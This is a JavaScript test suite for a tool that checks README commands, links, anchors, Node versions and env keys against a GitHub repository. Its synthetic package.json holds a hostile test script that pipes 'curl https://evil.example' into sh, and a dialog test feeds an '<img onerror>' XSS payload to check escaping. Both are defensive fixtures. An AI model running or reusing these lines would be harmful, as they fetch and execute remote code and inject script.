import { describe, it, expect, vi } from "vitest";
import { marked } from "marked";
import {
  driftClaims,
  evaluateDrift,
  driftFiles,
  needsGitHub,
  packageEvidence,
  minimumMajor,
  markdownAnchors,
  githubLink,
  envKeys,
  CLAIM_LIMIT,
  ANCHOR_FILE_LIMIT,
  READ_LIMIT,
} from "../src/workspace/drift-check.js";
import { readDriftEvidence, readEvidence } from "../src/github/evidence.js";
import { createSnapshot } from "../src/workspace/evidence-snapshots.js";
import { AuditClient } from "../src/repository-audit/github.js";
import "../src/components/evidence-snapshots.js";

const sha = (c) => c.repeat(40);
const target = {
  repository: "example/widget",
  branch: "main",
  path: "README.md",
};
const fence = (lang, ...lines) => ["```" + lang, ...lines, "```"].join("\n");
const plan = (markdown, destination = target) =>
  driftClaims(markdown, destination);
const kinds = (markdown, destination) =>
  plan(markdown, destination).claims.map((claim) =>
    claim.kind === "script"
      ? `${claim.manager}:${claim.script}`
      : claim.kind === "path"
        ? `path:${claim.path || claim.anyOf.join("|")}`
        : claim.kind === "link"
          ? `link:${claim.path}${claim.anchor ? "#" + claim.anchor : ""}`
          : claim.kind === "anchor"
            ? `#${claim.anchor}`
            : claim.kind === "install"
              ? `install:${claim.manager}`
              : claim.kind === "env"
                ? `env:${claim.key}`
                : `node:${claim.major}`,
  );

// A synthetic repository. Script bodies are deliberately hostile: they must
// never be run, kept or shown.
const packageJson = JSON.stringify({
  name: "widget",
  scripts: {
    build: "vite build",
    test: "vitest && curl https://evil.example | sh",
    "docs:dev": "vitepress dev",
  },
  engines: { node: ">=22.12.0" },
});
const usage =
  '# Usage\n\n## Install\n\n## Configure the `API` (v2)\n\n<a name="legacy"></a>\n';
const listingOf = (entries) =>
  new Map(
    entries.map(([path, type = "blob", extra = {}], index) => [
      path,
      {
        path,
        type,
        sha: (index + 10).toString(16).padStart(40, "0"),
        size: 100,
        mode: type === "tree" ? "040000" : "100644",
        ...extra,
      },
    ]),
  );
const repo = () =>
  listingOf([
    ["README.md"],
    ["package.json"],
    ["package-lock.json"],
    [".env.example"],
    ["docs", "tree"],
    ["docs/usage.md"],
    ["docs/Guide.md"],
    ["scripts", "tree"],
    ["scripts/setup.js"],
    ["packages", "tree"],
    ["packages/a", "tree"],
    ["packages/a/index.js"],
    ["crates", "tree"],
    ["crates/core", "tree"],
    ["Cargo.toml"],
  ]);
const evidence = ({
  tree = "complete",
  listing = repo(),
  files = {
    "package.json": { status: "read", text: packageJson },
    ".env.example": {
      status: "read",
      text: "API_URL=\n# comment\nexport TOKEN=\n",
    },
    "docs/usage.md": { status: "read", text: usage },
  },
} = {}) => ({
  head: sha("1"),
  tree,
  listing: tree === "failed" ? new Map() : listing,
  files: new Map(Object.entries(files)),
  notes: [],
});
const check = (markdown, read = evidence(), options) =>
  evaluateDrift(plan(markdown), read, options);
const status = (result, text) =>
  result.results
    .filter((item) => item.text === text)
    .map((item) => item.status);
const one = (result, text) => {
  const items = result.results.filter((item) => item.text === text);
  expect(items, text).toHaveLength(1);
  return items[0];
};

describe("drift claims", () => {
  it("reads commands only from shell fences, skipping output, comments and other languages", () => {
    const markdown = [
      fence(
        "bash",
        "npm run build # trailing comment",
        "# npm run commented",
        "$ npm test",
      ),
      fence(
        "console",
        "$ yarn lint",
        "npm run output-line",
        // npm echoes its script as `> pkg@1.0.0 build` / `> node ...`.
        "> widget@1.0.0 build",
        "> node scripts/missing.js",
        "PS> pnpm run serve",
      ),
      fence("js", 'exec("npm run from-js")'),
      fence("", "npm run unlabeled"),
      "    npm run indented",
      "",
      fence("sh", "node scripts/setup.js \\", "  --verbose"),
    ].join("\n\n");
    expect(kinds(markdown)).toEqual([
      "npm:build",
      "npm:test",
      "yarn:lint",
      "pnpm:serve",
      "npm:unlabeled",
      "path:scripts/setup.js",
    ]);
    const continued = plan(markdown).claims.at(-1);
    expect(continued.text).toBe("node scripts/setup.js  --verbose");
  });

  it("ignores placeholders, variables, global installs, npx and package arguments", () => {
    const markdown = fence(
      "bash",
      "npm install -g widget-cli",
      "npm install left-pad",
      "npx create-widget",
      "node $SCRIPT",
      "node path/to/file.js",
      "node <file>",
      "python -m http.server",
      "node ~/bin/tool.js",
      "node /usr/lib/tool.js",
      "yarn add react",
      "pnpm dlx create-thing",
      "npm run",
      "bun test",
    );
    expect(kinds(markdown)).toEqual([]);
  });

  it("marks workspace-scoped commands and follows clone, cd, created files and redirects", () => {
    const claims = plan(
      fence(
        "bash",
        "git clone https://github.com/example/widget.git",
        "cd widget",
        "npm run build -w packages/a",
        "pnpm --filter a run dev",
        "yarn workspace a build",
        "cp .env.example .env && node .env",
        "node gen.js > out.js && node out.js",
        "mkdir -p tmp/cache && node tmp/cache/run.js",
        "cd packages/a",
        "node index.js",
      ),
    ).claims;
    expect(claims.map((c) => c.script || c.path)).toEqual([
      "build",
      "dev",
      ".env.example",
      "gen.js",
      "index.js",
    ]);
    expect(claims[0].scope).toBe("workspace");
    expect(claims[1].scope).toBe("workspace");
    expect(claims.at(-1).cd).toEqual(["widget", "packages/a"]);
    expect(claims.at(-1).clones).toContain("widget");
  });

  it("collects relative, anchor and same-branch GitHub links and counts what it skips", () => {
    const destination = { ...target, path: "docs/README.md" };
    const markdown = [
      "See [usage](usage.md#install), [top](#intro), [self](README.md#intro) and [root](/LICENSE).",
      "[out](../../outside.md) [bad](%E0%A4%A.md) [site](https://example.com) [mail](mailto:a@example.com)",
      "[blob](https://github.com/Example/Widget/blob/main/docs/usage.md#install) [old](https://github.com/example/widget/blob/v1.0/docs/usage.md)",
      "[raw](https://raw.githubusercontent.com/example/widget/refs/heads/main/logo.svg) [other](https://github.com/someone/else/blob/main/x.md)",
      '<img src="img/logo.png" alt="">',
      fence("md", "[fenced](fenced.md)"),
    ].join("\n");
    const result = plan(markdown, destination);
    expect(kinds(markdown, destination)).toEqual([
      "link:docs/usage.md#install",
      "#intro",
      "#intro",
      "link:LICENSE",
      "link:docs/usage.md#install",
      "link:logo.svg",
      "link:docs/img/logo.png",
    ]);
    expect(result.notes.join(" ")).toMatch(/1 relative link\(s\) point above/);
    expect(result.notes.join(" ")).toMatch(
      /1 relative link\(s\) could not be decoded/,
    );
    expect(result.notes.join(" ")).toMatch(/another branch or commit/);
    expect(githubLink("https://github.com/example/widget", target)).toBeNull();
    expect(githubLink("not a url", target)).toBeNull();
  });

  it("reports source line numbers through CRLF, lists and repeated text", () => {
    const markdown = [
      "# Title",
      "",
      "Run `npm run build` first.",
      "",
      "- Step:",
      "",
      "  ```bash",
      "  npm run build",
      "  npm run build",
      "  ```",
      "",
      "[usage](docs/usage.md) and again [usage](docs/usage.md)",
    ].join("\r\n");
    const claims = plan(markdown).claims;
    // A blank first line inside a fence does not shift later lines.
    expect(plan(fence("bash", "", "npm test")).claims[0].line).toBe(3);
    // The same claim twice on one line is checked once.
    expect(claims.map((c) => c.line)).toEqual([3, 8, 9, 12]);
    expect(claims[0].where).toBe("inline");
  });

  it("reads Node version statements from prose and env keys from env fences and exports", () => {
    const markdown = [
      "Requires Node.js 18 or newer. ![node](https://img.shields.io/badge/node-%3E%3D16-green)",
      "",
      "Use node >= 20 for development.",
      "",
      fence(
        "env",
        "API_URL=https://example.com",
        "# comment",
        "export TOKEN=abc",
      ),
      fence("bash", "export PORT=3000"),
      fence("bash", "node --version  # Node 14 or later"),
    ].join("\n");
    expect(kinds(markdown)).toEqual([
      "node:18",
      "node:20",
      "env:API_URL",
      "env:TOKEN",
      "env:PORT",
    ]);
  });

  it("bounds the number of claims and says how many were not checked", () => {
    const lines = Array.from(
      { length: CLAIM_LIMIT + 7 },
      (_, i) => `npm run s${i}`,
    );
    const result = plan(fence("bash", ...lines));
    expect(result.claims).toHaveLength(CLAIM_LIMIT);
    expect(result.notes[0]).toContain("7 more were not");
  });

  it("knows when GitHub is not needed and which files a plan reads", () => {
    expect(needsGitHub(plan("[a](#a)\n\n# A"))).toBe(false);
    expect(needsGitHub(plan(fence("bash", "npm test")))).toBe(true);
    const anchors = Array.from(
      { length: ANCHOR_FILE_LIMIT + 2 },
      (_, i) => `[d${i}](docs/d${i}.md#x)`,
    ).join(" ");
    const listing = listingOf([
      ["package.json"],
      [".env.sample"],
      ...Array.from({ length: ANCHOR_FILE_LIMIT + 2 }, (_, i) => [
        `docs/d${i}.md`,
      ]),
    ]);
    const files = driftFiles(
      plan(`${anchors}\n\n${fence("bash", "npm test", "export KEY=1")}`),
      { listing },
    );
    expect(files.paths.slice(0, 2)).toEqual(["package.json", ".env.sample"]);
    expect(files.paths).toHaveLength(2 + ANCHOR_FILE_LIMIT);
    expect(files.notes[0]).toContain("2 more are unknown");
    // Files absent from the listing, directories and non-Markdown files are never read.
    expect(
      driftFiles(plan("[x](docs#a) [y](a.txt#b) [z](gone.md#c)"), {
        listing: listingOf([["docs", "tree"], ["a.txt"]]),
      }).paths,
    ).toEqual([]);
  });
});

describe("drift evaluation", () => {
  it("separates observed script mismatches from heuristics", () => {
    const result = check(
      [
        fence(
          "bash",
          "npm run build",
          "npm test",
          "npm run lint",
          "npm run-script docs:dev",
          "pnpm run lint",
          "yarn lint",
          "bun run lint",
          "npm start",
          "npm run lint --if-present",
        ),
        "Or run `npm run lint`.",
      ].join("\n\n"),
    );
    expect(status(result, "npm run build")).toEqual(["matches"]);
    expect(status(result, "npm test")).toEqual(["matches"]);
    expect(status(result, "npm run-script docs:dev")).toEqual(["matches"]);
    const lint = result.results.find(
      (item) => item.text === "npm run lint" && item.where === "block",
    );
    expect(lint.status).toBe("mismatch");
    expect(lint.message).toBe(
      'package.json has no "lint" script (scripts: build, test, docs:dev).',
    );
    expect(lint.evidencePath).toBe("package.json");
    expect(status(result, "pnpm run lint")).toEqual(["mismatch"]);
    expect(one(result, "yarn lint").status).toBe("uncertain");
    expect(one(result, "yarn lint").message).toContain("can also run a binary");
    expect(status(result, "bun run lint")).toEqual(["uncertain"]);
    expect(one(result, "npm start").message).toContain("has a default");
    expect(one(result, "npm run lint --if-present").message).toContain(
      "--if-present",
    );
    expect(status(result, "npm run lint --if-present")).toEqual(["uncertain"]);
    const inline = result.results.find((item) => item.where === "inline");
    expect(inline.status).toBe("uncertain");
    expect(inline.message).toContain("mentioned inline");
    // Script bodies are data only; none reaches a result.
    expect(JSON.stringify(result)).not.toContain("evil.example");
    expect(result.counts).toEqual({
      mismatch: 2,
      uncertain: 5,
      unknown: 0,
      matches: 3,
    });
    expect(result.results.map((item) => item.status)).toEqual([
      "mismatch",
      "mismatch",
      ...Array(5).fill("uncertain"),
      ...Array(3).fill("matches"),
    ]);
  });

  it("keeps unreadable, unparseable and unlisted package.json evidence unknown, never drift", () => {
    const markdown = fence("bash", "npm run lint");
    const failed = check(
      markdown,
      evidence({
        files: {
          "package.json": {
            status: "failed",
            note: "GitHub request failed (500).",
          },
        },
      }),
    );
    expect(failed.results[0].status).toBe("unknown");
    expect(failed.results[0].message).toContain("GitHub request failed (500).");
    const broken = check(
      markdown,
      evidence({
        files: { "package.json": { status: "read", text: "{ not json" } },
      }),
    );
    expect(broken.results[0].status).toBe("unknown");
    expect(broken.results[0].message).toContain("could not be parsed");
    for (const tree of ["truncated", "failed"]) {
      const listing = repo();
      listing.delete("package.json");
      const result = check(markdown, evidence({ tree, listing, files: {} }));
      expect(result.results[0].status, tree).toBe("unknown");
    }
    const absent = repo();
    absent.delete("package.json");
    const missing = check(markdown, evidence({ listing: absent, files: {} }));
    expect(missing.results[0].status).toBe("mismatch");
    expect(missing.results[0].message).toContain("No package.json");
    expect(check(markdown, null).results[0].status).toBe("unknown");
  });

  it("does not judge commands that run in workspaces, other folders or an ambiguous directory", () => {
    const result = check(
      [
        fence(
          "bash",
          "npm run lint -w packages/a",
          "cd packages/a",
          "npm run lint",
          "node index.js",
          "node missing.js",
        ),
        fence("bash", "node other.js"),
        fence("bash", "cd somewhere-else", "node anything.js", "npm run lint"),
      ].join("\n\n"),
    );
    expect(status(result, "npm run lint -w packages/a")).toEqual(["unknown"]);
    expect(status(result, "npm run lint")).toEqual(["unknown", "unknown"]);
    expect(status(result, "node index.js")).toEqual(["matches"]);
    // In the folder it changed into, a missing file is still an observed mismatch.
    expect(status(result, "node missing.js")).toEqual(["mismatch"]);
    expect(one(result, "node missing.js").message).toContain(
      "packages/a/missing.js",
    );
    // The next block may continue in packages/a or start at the root.
    expect(status(result, "node other.js")).toEqual(["uncertain"]);
    expect(one(result, "node other.js").message).toContain("another directory");
    expect(status(result, "node anything.js")).toEqual(["unknown"]);
    // A README in a subfolder makes the working directory ambiguous too.
    const nested = evaluateDrift(
      plan(fence("bash", "npm run lint", "node gone.js"), {
        ...target,
        path: "docs/README.md",
      }),
      evidence(),
    );
    expect(nested.results.map((item) => item.status)).toEqual([
      "uncertain",
      "uncertain",
    ]);
  });

  it("reports missing command files, with generated, ignored and case-only cases kept uncertain", () => {
    const result = check(
      fence(
        "bash",
        "node scripts/setup.js",
        "node scripts/seed.js",
        "node Scripts/setup.js",
        "npm run build && node dist/index.js",
        "node .env.local",
        "make build",
        "make -f build.mk",
        "docker compose up",
        "pip install -r requirements.txt",
        "cd crates/core",
        "cargo build",
      ),
    );
    expect(status(result, "node scripts/setup.js")).toEqual(["matches"]);
    expect(one(result, "node scripts/seed.js").status).toBe("mismatch");
    expect(one(result, "node scripts/seed.js").message).toBe(
      `scripts/seed.js: not in the repository at ${sha("1").slice(0, 7)}.`,
    );
    const cased = one(result, "node Scripts/setup.js");
    expect(cased.status).toBe("mismatch");
    expect(cased.message).toContain(
      "scripts/setup.js exists; GitHub paths are case-sensitive.",
    );
    // Results are ordered by status: the generated dist/ file before the
    // matching build script.
    expect(status(result, "npm run build && node dist/index.js")).toEqual([
      "uncertain",
      "matches",
    ]);
    expect(status(result, "node .env.local")).toEqual(["uncertain"]);
    const nested = check(fence("bash", "cd packages/a", "node dist/cli.js"));
    expect(status(nested, "node dist/cli.js")).toEqual(["uncertain"]);
    expect(one(nested, "node dist/cli.js").message).toContain(
      "packages/a/dist/cli.js",
    );
    expect(one(result, "make build").status).toBe("mismatch");
    expect(one(result, "make build").message).toContain(
      "make needs Makefile or makefile or GNUmakefile",
    );
    expect(status(result, "make -f build.mk")).toEqual(["mismatch"]);
    expect(status(result, "docker compose up")).toEqual(["mismatch"]);
    expect(status(result, "pip install -r requirements.txt")).toEqual([
      "mismatch",
    ]);
    // cargo looks upward for Cargo.toml.
    expect(status(result, "cargo build")).toEqual(["matches"]);
    // Inline path mentions are heuristics.
    const inline = check("Edit `src/config/app.js` or `scripts/setup.js`.");
    expect(inline.results.map((item) => item.status)).toEqual([
      "uncertain",
      "matches",
    ]);
  });

  it("checks lockfiles and package managers", () => {
    const listing = repo();
    listing.delete("package-lock.json");
    const noLock = check(
      fence("bash", "npm ci", "npm install"),
      evidence({ listing }),
    );
    expect(status(noLock, "npm ci")).toEqual(["mismatch"]);
    // With no lockfile at all, npm install only needs package.json.
    expect(status(noLock, "npm install")).toEqual(["matches"]);
    expect(one(noLock, "npm install").message).toContain("no lockfile");
    const empty = check(
      fence("bash", "npm install", "yarn"),
      evidence({ listing: listingOf([["src", "tree"]]) }),
    );
    expect(status(empty, "npm install")).toEqual(["uncertain"]);
    expect(status(empty, "yarn")).toEqual(["uncertain"]);
    expect(one(empty, "npm install").message).toContain(
      "No package.json or lockfile",
    );
    expect(
      status(
        check(
          fence("bash", "npm install"),
          evidence({
            tree: "truncated",
            listing: listingOf([["src", "tree"]]),
          }),
        ),
        "npm install",
      ),
    ).toEqual(["unknown"]);
    const result = check(
      fence("bash", "npm ci", "yarn install", "yarn", "pnpm install"),
    );
    expect(status(result, "npm ci")).toEqual(["matches"]);
    expect(status(result, "yarn install")).toEqual(["uncertain"]);
    expect(one(result, "yarn install").message).toContain("package-lock.json");
    expect(status(result, "yarn")).toEqual(["uncertain"]);
    const declared = check(
      fence("bash", "npm install"),
      evidence({
        files: {
          "package.json": {
            status: "read",
            text: JSON.stringify({ packageManager: "pnpm@9.1.0" }),
          },
        },
      }),
    );
    expect(one(declared, "npm install").status).toBe("uncertain");
    expect(one(declared, "npm install").message).toContain(
      "packageManager pnpm",
    );
    const truncated = new Map(repo());
    truncated.delete("package-lock.json");
    expect(
      status(
        check(
          fence("bash", "npm ci"),
          evidence({ tree: "truncated", listing: truncated }),
        ),
        "npm ci",
      ),
    ).toEqual(["unknown"]);
  });

  it("reports missing linked files, broken anchors and unreadable link evidence", () => {
    const result = check(
      [
        "[usage](docs/usage.md#install) [config](docs/usage.md#configure-the-api-v2) [legacy](docs/usage.md#legacy)",
        "[near](docs/usage.md#configure-the-api-v-2) [gone](docs/usage.md#uninstall) [line](scripts/setup.js#L3)",
        "[missing](docs/missing.md) [cased](docs/guide.md) ![logo](img/logo.png) [dir](docs/)",
        "[blob](https://github.com/example/widget/blob/main/docs/removed.md)",
      ].join("\n"),
    );
    const by = (text) => one(result, text);
    expect(by("docs/usage.md#install").status).toBe("matches");
    expect(by("docs/usage.md#configure-the-api-v2").status).toBe("matches");
    expect(by("docs/usage.md#legacy").status).toBe("matches");
    expect(by("docs/usage.md#configure-the-api-v-2").status).toBe("uncertain");
    expect(by("docs/usage.md#configure-the-api-v-2").message).toContain(
      "#configure-the-api-v2 is similar",
    );
    expect(by("docs/usage.md#uninstall").status).toBe("mismatch");
    expect(by("scripts/setup.js#L3").status).toBe("matches");
    expect(by("docs/missing.md").status).toBe("mismatch");
    expect(by("docs/guide.md").message).toContain("docs/Guide.md exists");
    expect(by("img/logo.png").message).toMatch(
      /^Image img\/logo.png is not in the repository/,
    );
    expect(by("docs/").status).toBe("matches");
    expect(
      by("https://github.com/example/widget/blob/main/docs/removed.md").status,
    ).toBe("mismatch");

    const failed = check(
      "[usage](docs/usage.md#install) [new](docs/new.md)",
      evidence({
        tree: "truncated",
        files: {
          "docs/usage.md": {
            status: "failed",
            note: "Larger than the 256 KB read limit.",
          },
        },
      }),
    );
    expect(failed.results.map((item) => [item.text, item.status])).toEqual([
      ["docs/usage.md#install", "unknown"],
      ["docs/new.md", "unknown"],
    ]);
    expect(failed.results[0].message).toContain("256 KB");
    expect(failed.results[1].message).toContain("truncated");
  });

  it("checks anchors within the document offline, allowing GitHub's built-in anchors", () => {
    const markdown = [
      "# Widget",
      "## Getting Started!",
      "## Getting Started!",
      '<h2 id="Custom">Custom</h2>',
      "[a](#getting-started) [b](#getting-started-1) [c](#Custom) [d](#getting_started) [j](#custom)",
      "[e](#removed-section) [f](#top) [g](#readme) [h](#user-content-widget) [i](#L10)",
    ].join("\n\n");
    expect(markdownAnchors(markdown)).toEqual(
      expect.arrayContaining([
        "widget",
        "getting-started",
        "getting-started-1",
        "custom",
        "Custom",
      ]),
    );
    const result = evaluateDrift(plan(markdown), null);
    expect(result.results.map((item) => [item.text, item.status])).toEqual([
      ["#removed-section", "mismatch"],
      ["#getting_started", "uncertain"],
      ["#getting-started", "matches"],
      ["#getting-started-1", "matches"],
      ["#Custom", "matches"],
      ["#custom", "matches"],
      ["#user-content-widget", "matches"],
    ]);
    expect(result.head).toBe("");
  });

  it("treats Node version prose and env keys as heuristics", () => {
    const result = check(
      [
        "Requires Node.js 18 or newer.",
        "",
        "Node 22+ is supported.",
        "",
        fence("env", "API_URL=x", "SECRET_KEY=y", "TOKEN=z"),
      ].join("\n"),
    );
    expect(status(result, "Node.js 18 or newer")).toEqual(["uncertain"]);
    expect(one(result, "Node.js 18 or newer").message).toContain('">=22.12.0"');
    expect(status(result, "Node 22+")).toEqual(["matches"]);
    expect(status(result, "API_URL=x")).toEqual(["matches"]);
    expect(status(result, "TOKEN=z")).toEqual(["matches"]);
    expect(one(result, "SECRET_KEY=y").status).toBe("uncertain");
    expect(one(result, "SECRET_KEY=y").message).toContain(
      "The code may still read it.",
    );
    expect(result.counts.mismatch).toBe(0);

    const odd = check(
      "Requires Node 18 or later.",
      evidence({
        files: {
          "package.json": {
            status: "read",
            text: '{"engines":{"node":"<20"}}',
          },
        },
      }),
    );
    expect(odd.results[0].status).toBe("unknown");
    const listing = repo();
    listing.delete(".env.example");
    const noExample = check(fence("env", "API_URL=x"), evidence({ listing }));
    expect(noExample.results).toEqual([]);
    expect(noExample.notes.join(" ")).toContain(
      "1 environment variable(s) were not checked",
    );
  });

  it("annotates results with what changed since the Baseline", () => {
    const baseline = createSnapshot({
      documentId: "doc-1",
      target,
      source: "",
      now: Date.UTC(2026, 9, 1),
      evidence: {
        head: sha("9"),
        tree: "complete",
        entries: [
          {
            path: "README.md",
            kind: "readme",
            status: "captured",
            type: "file",
            sha: sha("3"),
          },
          {
            path: "package.json",
            kind: "manifest",
            status: "captured",
            type: "file",
            sha: sha("4"),
          },
          { path: "docs/usage.md", kind: "linked", status: "missing" },
        ],
      },
    });
    const result = check(
      `${fence("bash", "npm run lint")}\n\n[usage](docs/usage.md)`,
      evidence(),
      { baseline },
    );
    expect(one(result, "npm run lint").baseline).toBe("changed");
    expect(one(result, "docs/usage.md").baseline).toBe("added");
  });

  it("parses repository files as data only", () => {
    expect(packageEvidence(packageJson)).toEqual({
      scripts: ["build", "test", "docs:dev"],
      workspaces: false,
      node: ">=22.12.0",
      packageManager: "",
    });
    expect(packageEvidence('{"scripts":["a"]}').scripts).toEqual([]);
    expect(packageEvidence('﻿{"scripts":{"a":"b"}}').scripts).toEqual(["a"]);
    expect(() => packageEvidence("[]")).toThrow();
    expect(envKeys("A=1\n  export B=2\n#C=3\nnot a key\n")).toEqual(["A", "B"]);
    expect(minimumMajor(">=22.12.0")).toBe(22);
    expect(minimumMajor("^20.0.0 || >=22")).toBe(20);
    expect(minimumMajor("18.x")).toBe(18);
    expect(minimumMajor(">18")).toBe(19);
    expect(minimumMajor("*")).toBeNull();
    expect(minimumMajor("<20")).toBeNull();
  });
});

const json = (data, status = 200, headers = {}) =>
  new Response(JSON.stringify(data), { status, headers });
const blob = (text) => {
  const bytes = new TextEncoder().encode(text);
  return {
    encoding: "base64",
    size: bytes.length,
    content: btoa(String.fromCharCode(...bytes)),
  };
};
function github({ tree, blobs = {}, head = sha("1") }) {
  const requests = [];
  const client = new AuditClient({
    fetcher: async (url, init) => {
      requests.push({ url, method: init?.method || "GET" });
      if (url.includes("/commits?"))
        return typeof head === "number"
          ? json({}, head)
          : json([{ sha: head, commit: { tree: { sha: sha("2") } } }]);
      if (url.includes("/git/trees/"))
        return typeof tree === "number" ? json({}, tree) : json(tree);
      const match = url.match(/\/git\/blobs\/([a-f\d]+)$/);
      if (match && match[1] in blobs) {
        const reply = blobs[match[1]];
        return typeof reply === "function" ? reply() : json(reply);
      }
      return json({}, 404);
    },
  });
  return { client, requests };
}
const treeOf = (items, truncated = false) => ({
  sha: sha("2"),
  truncated,
  tree: items.map(([path, type, id, extra = {}]) => ({
    path,
    type,
    sha: sha(id),
    size: 50,
    mode: "100644",
    ...extra,
  })),
});
const markdown = [
  "Requires Node.js 18 or newer.",
  "",
  fence(
    "bash",
    "npm ci",
    "npm run build",
    "npm run lint",
    "node scripts/seed.js",
    "export API_URL=x",
  ),
  "",
  "[usage](docs/usage.md#install) [old](docs/usage.md#removed) [gone](docs/gone.md)",
].join("\n");

describe("reading drift evidence", () => {
  const files = treeOf([
    ["README.md", "blob", "3"],
    ["package.json", "blob", "4"],
    ["package-lock.json", "blob", "5"],
    [".env.example", "blob", "6"],
    ["docs", "tree", "7"],
    ["docs/usage.md", "blob", "8"],
    ["scripts", "tree", "9"],
  ]);
  const blobs = {
    [sha("4")]: blob(packageJson),
    [sha("6")]: blob("API_URL=\n"),
    [sha("8")]: blob(usage),
  };

  it("reads the tree and a bounded set of blobs by revision with GET only, then discards content", async () => {
    const { client, requests } = github({ tree: files, blobs });
    const drift = plan(markdown);
    const read = await readDriftEvidence({ client, target, plan: drift });
    expect(requests.map((r) => r.method)).toEqual(Array(5).fill("GET"));
    expect(
      requests.map((r) =>
        r.url.replace("https://api.github.com/repos/example/widget", ""),
      ),
    ).toEqual([
      "/commits?sha=main&per_page=1",
      `/git/trees/${sha("2")}?recursive=1`,
      `/git/blobs/${sha("4")}`,
      `/git/blobs/${sha("6")}`,
      `/git/blobs/${sha("8")}`,
    ]);
    const result = evaluateDrift(drift, read);
    expect(result.head).toBe(sha("1"));
    expect(
      result.results.map((item) => [item.text.slice(0, 22), item.status]),
    ).toEqual([
      ["npm run lint", "mismatch"],
      ["node scripts/seed.js", "mismatch"],
      ["docs/usage.md#removed", "mismatch"],
      ["docs/gone.md", "mismatch"],
      ["Node.js 18 or newer", "uncertain"],
      ["npm ci", "matches"],
      ["npm run build", "matches"],
      ["export API_URL=x", "matches"],
      ["docs/usage.md#install", "matches"],
    ]);
    const serialized = JSON.stringify(result);
    expect(serialized).not.toContain("evil.example");
    expect(serialized).not.toContain("vite build");
    expect(serialized).not.toContain("# Usage");
  });

  it("keeps unreadable files unknown and stops after a rate limit", async () => {
    const tooBig = treeOf([
      ["package.json", "blob", "4", { size: READ_LIMIT + 1 }],
      [".env.example", "blob", "6", { mode: "120000" }],
      ["docs", "tree", "7"],
      ["docs/usage.md", "blob", "8"],
      ["docs/b.md", "blob", "a"],
    ]);
    const { client, requests } = github({
      tree: tooBig,
      blobs: {
        [sha("8")]: () =>
          json({ message: "limit" }, 403, {
            "x-ratelimit-remaining": "0",
            "x-ratelimit-reset": "9999999999",
          }),
        [sha("a")]: blob("# B"),
      },
    });
    const drift = plan(`${markdown}\n[b](docs/b.md#b)`);
    const read = await readDriftEvidence({ client, target, plan: drift });
    expect(read.files.get("package.json").note).toContain("256 KB");
    expect(read.files.get(".env.example").note).toBe("Not a regular file.");
    expect(read.files.get("docs/usage.md").status).toBe("failed");
    expect(read.files.get("docs/b.md").note).toMatch(/^Not read: /);
    // Oversized and symbolic-link files are refused without a request, and
    // nothing is requested after the rate limit.
    expect(requests.filter((r) => r.url.includes("/git/blobs/"))).toHaveLength(
      1,
    );
    const result = evaluateDrift(drift, read);
    for (const text of [
      "npm run build",
      "npm run lint",
      "docs/usage.md#install",
      "docs/b.md#b",
    ])
      expect(status(result, text), text).toEqual(["unknown"]);
    // seed.js, gone.md and npm ci's missing lockfile are confirmed by the tree.
    expect(result.counts.mismatch).toBe(3);
  });

  it("treats non-UTF-8, malformed and failed blobs as unknown", async () => {
    const { client } = github({
      tree: files,
      blobs: {
        [sha("4")]: { encoding: "base64", size: 2, content: btoa("\xff\xfe") },
        [sha("6")]: { encoding: "utf-8", size: 9, content: "API_URL=\n" },
        [sha("8")]: () => json({}, 500),
      },
    });
    const read = await readDriftEvidence({
      client,
      target,
      plan: plan(markdown),
    });
    expect(read.files.get("package.json").note).toBe("Not UTF-8 text.");
    expect(read.files.get(".env.example").note).toContain("unreadable");
    expect(read.files.get("docs/usage.md").note).toContain("500");
  });

  it("reads no content when the tree fails, and fails without saving when the head cannot be read", async () => {
    const failedTree = github({ tree: 500 });
    const read = await readDriftEvidence({
      client: failedTree.client,
      target,
      plan: plan(markdown),
    });
    expect(read.tree).toBe("failed");
    expect(failedTree.requests.some((r) => r.url.includes("/git/blobs/"))).toBe(
      false,
    );
    const result = evaluateDrift(plan(markdown), read);
    expect(result.counts.mismatch).toBe(0);
    expect(result.counts.unknown).toBe(result.results.length);

    await expect(
      readDriftEvidence({
        client: github({ tree: files, head: 404 }).client,
        target,
        plan: plan(markdown),
      }),
    ).rejects.toMatchObject({ kind: "not-found" });
    const offline = new AuditClient({
      fetcher: async () => {
        throw new TypeError("Failed to fetch");
      },
    });
    await expect(
      readDriftEvidence({ client: offline, target, plan: plan(markdown) }),
    ).rejects.toMatchObject({
      kind: "network",
    });
    const controller = new AbortController();
    controller.abort();
    await expect(
      readDriftEvidence({
        client: github({ tree: files, blobs }).client,
        target,
        plan: plan(markdown),
        signal: controller.signal,
      }),
    ).rejects.toThrow();
  });

  it("leaves snapshot capture unchanged by the shared tree reader", async () => {
    const { client } = github({ tree: files, blobs });
    const captured = await readEvidence({
      client,
      target,
      linked: ["docs/usage.md", "docs/gone.md"],
    });
    expect(captured.entries.map((e) => [e.path, e.status])).toEqual([
      ["README.md", "captured"],
      ["package.json", "captured"],
      ["package-lock.json", "captured"],
      ["docs/usage.md", "captured"],
      ["docs/gone.md", "missing"],
    ]);
  });
});

describe("drift check dialog", () => {
  it("groups findings, escapes repository text and shows empty and partial states", () => {
    const el = document.createElement("evidence-snapshots");
    el.configure({
      draft: { id: "doc-1", markdown: "" },
      target,
      snapshots: undefined,
    });
    expect(el.querySelector("[data-drift-run]").textContent).toBe(
      "Run drift check",
    );
    expect(el.querySelector("[data-drift]").hidden).toBe(true);
    const result = check(
      `${fence("bash", 'npm run "<img src=x onerror=alert(1)>"', "npm run build", "yarn lint")}\n\n[gone](#gone)`,
    );
    el.showDrift(result);
    const section = el.querySelector("[data-drift]");
    expect(section.hidden).toBe(false);
    expect(section.querySelector("img")).toBeNull();
    expect(section.querySelector("[data-drift-counts]").textContent).toBe(
      "1 observed mismatch · 1 uncertain · 0 unknown · 1 match",
    );
    expect(
      [...section.querySelectorAll("h3")].map((h) => h.textContent),
    ).toEqual(["Observed mismatches (1)", "Uncertain findings (1)"]);
    expect(
      section.querySelector('[data-drift-group="matches"] summary').textContent,
    ).toBe("Matches (1)");
    expect(section.textContent).toContain("Nothing was run, saved or written");
    expect(section.textContent).toContain("never treated as drift");
    // The unsafe script name is not a valid script name, so it is not a claim.
    expect(section.textContent).not.toContain("onerror");

    el.showDrift(
      evaluateDrift(plan("Plain text."), evidence({ tree: "truncated" })),
    );
    expect(el.querySelector("[data-drift-empty]")).not.toBeNull();
    expect(el.querySelector("[data-drift-partial]").textContent).toContain(
      "truncated",
    );
    const escaped = evaluateDrift(plan("[x](<docs/a&lt;b>.md>)"), evidence());
    el.showDrift(escaped);
